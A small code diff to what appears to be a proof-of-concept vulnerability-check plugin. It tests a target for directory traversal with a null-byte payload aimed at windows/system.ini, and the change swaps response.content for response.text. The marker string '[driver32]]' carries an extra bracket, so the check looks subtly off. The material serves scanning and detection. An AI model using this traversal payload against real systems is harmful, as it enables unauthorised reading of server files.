@@ -54,7 +54,7 @@ class Poc(ABPoc):
                 state=../../../../../../../../../../windows/system.ini%00
             '''
             response = requests.post(vul_url)
-            if response.status_code == 200 and '[driver32]]' in response.content:
+            if response.status_code == 200 and '[driver32]]' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
